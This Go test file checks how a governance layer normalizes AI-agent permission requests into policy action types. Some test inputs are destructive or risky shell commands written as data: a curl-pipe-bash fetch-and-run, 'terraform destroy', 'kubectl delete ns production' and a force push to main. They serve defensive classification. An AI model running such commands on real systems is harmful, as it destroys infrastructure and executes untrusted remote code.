package copilot

import (
	"os/exec"
	"path/filepath"
	"testing"

	copilotsdk "github.com/github/copilot-sdk/go"
	"github.com/chitinhq/chitin/go/execution-kernel/internal/gov"
)

// ptr returns a pointer to the given string value.
func ptr(s string) *string { return &s }

func TestNormalize_Shell(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: ptr("ls /tmp"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActShellExec {
		t.Errorf("Type: got %q, want shell.exec", got.Type)
	}
	if got.Target != "ls /tmp" {
		t.Errorf("Target: got %q, want 'ls /tmp'", got.Target)
	}
	if got.Path != "/work" {
		t.Errorf("Path: got %q, want /work", got.Path)
	}
}

func TestNormalize_ShellNilCommandText(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: nil,
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActShellExec {
		t.Errorf("Type: got %q, want shell.exec (even with nil command)", got.Type)
	}
	// Nil command text must produce empty Target, not a panic.
	if got.Target != "" {
		t.Errorf("Target: got %q, want empty on nil command", got.Target)
	}
}

func TestNormalize_Write(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:     copilotsdk.PermissionRequestKindWrite,
		FileName: ptr("/src/main.go"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActFileWrite {
		t.Errorf("Type: got %q, want file.write", got.Type)
	}
	if got.Target != "/src/main.go" {
		t.Errorf("Target: got %q, want '/src/main.go'", got.Target)
	}
}

func TestNormalize_WriteNilFileName(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:     copilotsdk.PermissionRequestKindWrite,
		FileName: nil,
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActFileWrite {
		t.Errorf("Type: got %q, want file.write", got.Type)
	}
	if got.Target != "" {
		t.Errorf("Target: got %q, want empty on nil FileName", got.Target)
	}
}

func TestNormalize_Read(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind: copilotsdk.PermissionRequestKindRead,
		Path: ptr("/etc/config"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActFileRead {
		t.Errorf("Type: got %q, want file.read", got.Type)
	}
	if got.Target != "/etc/config" {
		t.Errorf("Target: got %q, want '/etc/config'", got.Target)
	}
}

func TestNormalize_ReadNilPath(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind: copilotsdk.PermissionRequestKindRead,
		Path: nil,
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActFileRead {
		t.Errorf("Type: got %q, want file.read", got.Type)
	}
	if got.Target != "" {
		t.Errorf("Target: got %q, want empty on nil Path", got.Target)
	}
}

func TestNormalize_MCP(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:       copilotsdk.PermissionRequestKindMcp,
		ServerName: ptr("my-server"),
		ToolName:   ptr("my-tool"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActMCPCall {
		t.Errorf("Type: got %q, want mcp.call", got.Type)
	}
	// Target should be "serverName/toolName" when both are present.
	if got.Target != "my-server/my-tool" {
		t.Errorf("Target: got %q, want 'my-server/my-tool'", got.Target)
	}
}

func TestNormalize_MCPNilFields(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind: copilotsdk.PermissionRequestKindMcp,
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActMCPCall {
		t.Errorf("Type: got %q, want mcp.call", got.Type)
	}
	// Nil server/tool should not panic; target may be empty or partial.
}

func TestNormalize_URL(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind: copilotsdk.PermissionRequestKindURL,
		URL:  ptr("https://api.example.com/v1"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActHTTPRequest {
		t.Errorf("Type: got %q, want http.request", got.Type)
	}
	if got.Target != "https://api.example.com/v1" {
		t.Errorf("Target: got %q, want 'https://api.example.com/v1'", got.Target)
	}
}

func TestNormalize_Memory(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:    copilotsdk.PermissionRequestKindMemory,
		Subject: ptr("user preferences"),
	}
	got := Normalize(req, "/work")
	if got.Type != "memory.access" {
		t.Errorf("Type: got %q, want memory.access", got.Type)
	}
}

func TestNormalize_CustomTool(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:     copilotsdk.PermissionRequestKindCustomTool,
		ToolName: ptr("my-custom-tool"),
	}
	got := Normalize(req, "/work")
	if got.Type != "tool.custom" {
		t.Errorf("Type: got %q, want tool.custom", got.Type)
	}
}

func TestNormalize_Hook(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:        copilotsdk.PermissionRequestKindHook,
		HookMessage: ptr("pre-commit hook needs approval"),
	}
	got := Normalize(req, "/work")
	if got.Type != "hook.invoke" {
		t.Errorf("Type: got %q, want hook.invoke", got.Type)
	}
}

// TestNormalize_ShellRoutesThroughGov verifies that the driver's shell-kind
// normalizer routes through gov.Normalize, producing the most-specific
// canonical action type rather than always emitting shell.exec.
//
// Invariant: a PermissionRequestKindShell request whose FullCommandText is
// "terraform destroy" must produce Action.Type == gov.ActInfraDestroy, not
// gov.ActShellExec, because gov.classifyShellCommand maps it to infra.destroy.
func TestNormalize_ShellRoutesThroughGov(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: ptr("terraform destroy"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActInfraDestroy {
		t.Errorf("Type: got %q, want %q (via gov normalizer re-tagging)", got.Type, gov.ActInfraDestroy)
	}
	if got.Path != "/work" {
		t.Errorf("Path: got %q, want /work (preserved after gov.Normalize)", got.Path)
	}
	if got.Target != "terraform destroy" {
		t.Errorf("Target: got %q, want 'terraform destroy'", got.Target)
	}
}

// TestNormalize_ShellForcePushRoutesThroughGov verifies that git force-push
// is re-tagged to git.force-push so the no-force-push rule fires correctly.
//
// Invariant: "git push --force origin HEAD:main" must produce
// Action.Type == gov.ActGitForcePush, not gov.ActShellExec.
func TestNormalize_ShellForcePushRoutesThroughGov(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: ptr("git push --force origin HEAD:main"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActGitForcePush {
		t.Errorf("Type: got %q, want %q (via gov normalizer re-tagging)", got.Type, gov.ActGitForcePush)
	}
	if got.Path != "/work" {
		t.Errorf("Path: got %q, want /work (preserved after gov.Normalize)", got.Path)
	}
}

// TestNormalize_ShellCurlPipeBashShape verifies that curl-pipe-bash commands
// produce shell.exec with Params["shape"] = "curl-pipe-bash" so the
// no-curl-pipe-bash rule (which matches on action: shell.exec + target_regex)
// fires correctly, with the shape annotation as a bonus.
//
// Invariant: every curl ... | bash/sh command processed by the driver
// produces exactly one ActShellExec action with Params["shape"] = "curl-pipe-bash".
func TestNormalize_ShellCurlPipeBashShape(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: ptr("curl https://x/i.sh | bash"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActShellExec {
		t.Errorf("Type: got %q, want %q (curl-pipe-bash stays shell.exec)", got.Type, gov.ActShellExec)
	}
	if got.Path != "/work" {
		t.Errorf("Path: got %q, want /work", got.Path)
	}
	shape, _ := got.Params["shape"].(string)
	if shape != "curl-pipe-bash" {
		t.Errorf("Params[shape]: got %q, want 'curl-pipe-bash'", shape)
	}
}

// TestNormalize_ShellGenericCommandStaysShellExec verifies that ordinary
// shell commands that gov.classifyShellCommand does not reclassify still
// produce shell.exec with the correct target (regression guard: the gov
// routing must not corrupt benign commands).
//
// Invariant: "ls /tmp" → ActShellExec, target="ls /tmp", Path preserved.
func TestNormalize_ShellGenericCommandStaysShellExec(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: ptr("ls /tmp"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActShellExec {
		t.Errorf("Type: got %q, want %q", got.Type, gov.ActShellExec)
	}
	if got.Target != "ls /tmp" {
		t.Errorf("Target: got %q, want 'ls /tmp'", got.Target)
	}
	if got.Path != "/work" {
		t.Errorf("Path: got %q, want /work", got.Path)
	}
}

// TestNormalize_ShellPathPreservedAfterGovNormalize is the boundary test that
// gov.Normalize does not set Path (it is cwd-agnostic) — the driver must
// always overwrite Path = cwd after the gov call. This test uses a non-default
// cwd to make the invariant visible.
func TestNormalize_ShellPathPreservedAfterGovNormalize(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: ptr("kubectl delete ns production"),
	}
	got := Normalize(req, "/home/user/project")
	if got.Path != "/home/user/project" {
		t.Errorf("Path: got %q, want '/home/user/project' (gov.Normalize must not clear cwd)", got.Path)
	}
	if got.Type != gov.ActInfraDestroy {
		t.Errorf("Type: got %q, want %q", got.Type, gov.ActInfraDestroy)
	}
}

// Bare `git push` in a real git repo: gov returns Target="", driver
// resolves the current branch via `git symbolic-ref` so policy rules with
// `branches:` lists can match. Closes #62.
func TestNormalize_BareGitPushResolvesCurrentBranch(t *testing.T) {
	dir := initTestRepoOnBranch(t, "feature/test-x")
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: ptr("git push"),
	}
	got := Normalize(req, dir)
	if got.Type != gov.ActGitPush {
		t.Errorf("Type: got %q, want git.push", got.Type)
	}
	if got.Target != "feature/test-x" {
		t.Errorf("Target: got %q, want feature/test-x (resolved from HEAD)", got.Target)
	}
}

// Same bare push, but in a non-repo directory: resolution returns "" and
// Target stays empty — no panic, no spurious branch name.
func TestNormalize_BareGitPushOutsideRepoReturnsEmpty(t *testing.T) {
	dir := t.TempDir()
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: ptr("git push"),
	}
	got := Normalize(req, dir)
	if got.Type != gov.ActGitPush {
		t.Errorf("Type: got %q, want git.push", got.Type)
	}
	if got.Target != "" {
		t.Errorf("Target: got %q, want empty outside repo", got.Target)
	}
}

// Explicit `git push origin main` in the same repo must still produce
// Target="main" (driver-side resolution must not clobber explicit branches).
func TestNormalize_ExplicitGitPushDoesNotOverrideTarget(t *testing.T) {
	dir := initTestRepoOnBranch(t, "feature/test-y")
	req := copilotsdk.PermissionRequest{
		Kind:            copilotsdk.PermissionRequestKindShell,
		FullCommandText: ptr("git push origin main"),
	}
	got := Normalize(req, dir)
	if got.Target != "main" {
		t.Errorf("Target: got %q, want main (explicit branch must win)", got.Target)
	}
}

// initTestRepoOnBranch creates a fresh git repo at t.TempDir() with one
// initial commit, then checks out the given branch. Returns the repo path.
func initTestRepoOnBranch(t *testing.T, branch string) string {
	t.Helper()
	dir := t.TempDir()
	run := func(args ...string) {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.Dir = dir
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("%v: %v\n%s", args, err, out)
		}
	}
	run("git", "init", "-q")
	run("git", "config", "user.email", "test@example.com")
	run("git", "config", "user.name", "test")
	// Need a commit before checkout -b will work cleanly on some git versions.
	if err := exec.Command("touch", filepath.Join(dir, "x")).Run(); err != nil {
		t.Fatalf("touch: %v", err)
	}
	run("git", "add", "x")
	run("git", "commit", "-q", "-m", "init")
	run("git", "checkout", "-q", "-b", branch)
	return dir
}

func TestNormalize_UnknownKindIsFailClosed(t *testing.T) {
	req := copilotsdk.PermissionRequest{
		Kind: copilotsdk.PermissionRequestKind("this-kind-does-not-exist"),
	}
	got := Normalize(req, "/work")
	if got.Type != gov.ActUnknown {
		t.Errorf("Type: got %q, want unknown", got.Type)
	}
}

func TestNormalize_AllDocumentedKindsReturnSomething(t *testing.T) {
	// Invariant: every documented Kind produces a non-empty Type and Path==cwd.
	kinds := []copilotsdk.PermissionRequestKind{
		copilotsdk.PermissionRequestKindShell,
		copilotsdk.PermissionRequestKindWrite,
		copilotsdk.PermissionRequestKindRead,
		copilotsdk.PermissionRequestKindMcp,
		copilotsdk.PermissionRequestKindURL,
		copilotsdk.PermissionRequestKindMemory,
		copilotsdk.PermissionRequestKindCustomTool,
		copilotsdk.PermissionRequestKindHook,
	}
	for _, k := range kinds {
		t.Run(string(k), func(t *testing.T) {
			req := copilotsdk.PermissionRequest{Kind: k}
			got := Normalize(req, "/work")
			if got.Type == "" {
				t.Errorf("Kind %q produced empty Action.Type", k)
			}
			if got.Path != "/work" {
				t.Errorf("Kind %q: Path got %q, want /work", k, got.Path)
			}
		})
	}
}
